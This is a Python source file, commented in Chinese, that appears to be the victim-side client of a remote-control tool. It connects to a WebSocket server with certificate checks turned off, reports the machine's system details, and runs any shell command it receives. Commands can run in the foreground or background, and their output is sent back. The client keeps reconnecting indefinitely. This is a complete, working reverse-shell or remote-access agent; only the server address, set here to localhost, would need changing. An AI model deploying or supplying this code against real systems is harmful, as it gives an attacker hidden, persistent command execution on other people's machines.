import asyncio
import websockets
import subprocess
import platform
import ssl
import json
import os
from sys import exit

# --- 基础配置 ---
# HOST: 要连接的服务器IP地址
# PORT: 要连接的服务器端口号
HOST = '127.0.0.1' 
PORT = 8765

# --- 获取系统信息 ---

def get_systeminfo():
    """获取系统详细信息"""
    system = platform.system()
    node = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    systeminfo = f"{system} {node} {release} {version} {machine} {processor}"
    return systeminfo
    
# --- 被控端逻辑 ---
class Execute_command:
    """命令执行类，用于在本地执行系统命令"""
    def execute_command(self, command):
        """执行系统命令并返回结果"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            # 如果输出过长，截断输出，避免传输过大数据
            if len(stdout) > 900000:
                stdout = stdout[:900000] + "..."
            return {
                "要执行的命令": command,
                "返回码": result.returncode,
                "输出结果": stdout,
                "输出结果（错误）": result.stderr
            }
        except Exception as e:
            return {
                "要执行的命令": command,
                "错误": str(e)
            }

    def change_directory(self, directory):
        """切换工作目录"""
        try:
            os.chdir(directory)
            return "切换工作目录成功"
        except Exception as e:
            return "切换工作目录失败：" + str(e)
    
    def background(self, command):
        """在后台执行命令"""
        try:
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "命令已在后台运行"
        except Exception as e:
            return "后台运行命令失败: " + str(e)

# --- 客户端逻辑 ---
async def client_loop():
    """
    客户端主循环
    负责与服务器建立连接并处理接收到的命令
    """
    # 配置SSL上下文，禁用证书验证
    # 禁止在不信任的环境中使用此配置
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            # 尝试连接到服务器
            async with websockets.connect(f'wss://{HOST}:{PORT}', ssl=ssl_context, ping_interval=10) as websocket:
                execute_command = Execute_command()
                # 发送系统信息
                await websocket.send(get_systeminfo())
                # 持续接收并处理服务器发送的命令
                async for command in websocket:
                    match command:
                        case "exit": exit()
                        case command if command.startswith("command:"): 
                            # 执行命令并将结果发送回服务器
                            await websocket.send(json.dumps(execute_command.execute_command(command[8:]), ensure_ascii=False))
                        case command if command.startswith("cd:"):
                            # 切换工作目录
                            await websocket.send(execute_command.change_directory(command[3:]))
                        case command if command.startswith("background:"):
                            # 在后台运行命令
                            await websocket.send(execute_command.background(command[11:]))

        except Exception as e:
            # 发生异常时等待10秒后重试
            print(e)
            await asyncio.sleep(10)
        except KeyboardInterrupt:
            exit()

# --- 主函数 ---
if __name__ == "__main__":
    """程序入口点"""
    try:
        asyncio.run(client_loop())
    except KeyboardInterrupt:
        exit()
